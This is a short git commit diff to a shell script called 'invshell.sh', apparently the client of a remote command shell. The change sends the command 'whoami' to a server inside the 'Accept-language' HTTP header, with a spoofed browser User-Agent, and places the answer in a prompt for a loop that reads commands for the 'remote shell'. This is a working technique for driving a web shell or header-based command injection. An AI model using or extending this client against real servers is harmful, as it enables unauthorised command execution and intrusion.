34fe45e4f8be00a2d4f45df69e9247937eb12bf1
root <root@localhost.localdomain>
2019-04-15 10:19:23 -0400

    Executes whoami to acquire user

--- invshell.sh
+++ invshell.sh
@@ -23,12 +23,13 @@ then
   esac
 fi
 
-echo "Running on $domain"
 #creating temporary file
 echo -n "$domain" > .tmp 
+user=$(curl -s --header "Accept-language: whoami" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" http://localhost/header.php)
+echo "Running on '$domain' with user '$user'"
 while true
 do
-echo -n "user@omatr0n$ "
+echo -n "$user@omatr0n$ "
 #aks for command to send to remote shell
 read com
 	#checks if command is exit
